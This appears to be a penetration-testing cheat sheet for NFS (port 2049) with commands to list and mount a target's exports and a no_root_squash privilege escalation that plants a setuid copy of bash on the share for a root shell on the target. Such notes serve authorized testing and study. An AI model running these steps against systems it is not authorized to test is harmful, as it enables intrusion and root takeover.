# NFS (2049/tcp)

```bash
showmount -e TARGET                                         # show exports
sudo mkdir /mnt/nfs && sudo mount -t nfs TARGET:/share /mnt/nfs  # mount
ls -la /mnt/nfs/

# no_root_squash privesc (if enabled)
sudo cp /bin/bash /mnt/nfs/rootbash && sudo chmod u+s /mnt/nfs/rootbash
# On target: /share/rootbash -p

sudo umount /mnt/nfs                                        # unmount
```
